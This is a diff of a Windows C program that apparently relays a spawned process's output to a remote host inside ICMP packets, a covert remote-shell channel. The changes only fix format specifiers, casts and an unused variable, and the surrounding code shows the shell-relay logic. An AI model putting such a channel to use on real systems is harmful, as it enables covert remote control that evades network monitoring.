@@ -99,7 +99,7 @@ void usage(char *path)
 	printf("  -h                 this screen\n");
 	printf("  -b num             maximal number of blanks (unanswered icmp requests)\n");
     printf("                     before quitting\n");
-	printf("  -s bytes           maximal data buffer size in bytes (default is 64 bytes)\n\n", DEFAULT_MAX_DATA_SIZE);
+	printf("  -s bytes           maximal data buffer size in bytes (default is 64 bytes)\n\n");
 	printf("In order to improve the speed, lower the delay (-d) between requests or\n");
     printf("increase the size (-s) of the data buffer\n");
 }
@@ -110,7 +110,7 @@ void create_icmp_channel(HANDLE *icmp_chan)
 	*icmp_chan = (HANDLE) icmp_create();
 }
 
-int transfer_icmp(HANDLE icmp_chan, unsigned int target, char *out_buf, unsigned int out_buf_size, char *in_buf, unsigned int *in_buf_size, unsigned int max_in_data_size, unsigned int timeout)
+int transfer_icmp(HANDLE icmp_chan, unsigned int target, unsigned char *out_buf, unsigned int out_buf_size, unsigned char *in_buf, unsigned int *in_buf_size, unsigned int max_in_data_size, unsigned int timeout)
 {
 	int rs;
 	char *temp_in_buf;
@@ -184,7 +184,7 @@ int load_deps()
 		}
 	}
 	
-	printf("failed to load functions (%u)", GetLastError());
+	printf("failed to load functions (%lu)", GetLastError());
 
 	return 0;
 }
@@ -203,7 +203,6 @@ int main(int argc, char **argv)
 	PROCESS_INFORMATION pi;
 	int status;
 	unsigned int max_data_size;
-	struct hostent *he;
 
 
 	// set defaults
@@ -276,13 +275,13 @@ int main(int argc, char **argv)
 	// create icmp channel
 	create_icmp_channel(&icmp_chan);
 	if (icmp_chan == INVALID_HANDLE_VALUE) {
-	    printf("unable to create ICMP file: %u\n", GetLastError());
+	    printf("unable to create ICMP file: %lu\n", GetLastError());
 	    return -1;
 	}
 
 	// allocate transfer buffers
-	in_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
-	out_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
+	in_buf = malloc(max_data_size + ICMP_HEADERS_SIZE);
+	out_buf = malloc(max_data_size + ICMP_HEADERS_SIZE);
 	if (!in_buf || !out_buf) {
 		printf("failed to allocate memory for transfer buffers\n");
 		return -1;
@@ -297,25 +296,25 @@ int main(int argc, char **argv)
 		switch(status) {
 			case STATUS_SINGLE:
 				// reply with a static string
-				out_buf_size = sprintf(out_buf, "Test1234\n");
+				out_buf_size = sprintf((char *) out_buf, "Test1234\n");
 				break;
 			case STATUS_PROCESS_NOT_CREATED:
 				// reply with error message
-				out_buf_size = sprintf(out_buf, "Process was not created\n");
+				out_buf_size = sprintf((char *) out_buf, "Process was not created\n");
 				break;
 			default:
 				// read data from process via pipe
 				out_buf_size = 0;
-				if (PeekNamedPipe(pipe_read, NULL, 0, NULL, &out_buf_size, NULL)) {
+				if (PeekNamedPipe(pipe_read, NULL, 0, NULL, (long unsigned *)&out_buf_size, NULL)) {
 					if (out_buf_size > 0) {
 						out_buf_size = 0;
-						rs = ReadFile(pipe_read, out_buf, max_data_size, &out_buf_size, NULL);
+						rs = ReadFile(pipe_read, out_buf, max_data_size, (long unsigned *)&out_buf_size, NULL);
 						if (!rs && GetLastError() != ERROR_IO_PENDING) {
-							out_buf_size = sprintf(out_buf, "Error: ReadFile failed with %i\n", GetLastError());
+							out_buf_size = sprintf((char *)out_buf, "Error: ReadFile failed with %li\n", GetLastError());
 						} 
 					}
 				} else {
-					out_buf_size = sprintf(out_buf, "Error: PeekNamedPipe failed with %i\n", GetLastError());
+					out_buf_size = sprintf((char *)out_buf, "Error: PeekNamedPipe failed with %li\n", GetLastError());
 				}
 				break;
 		}
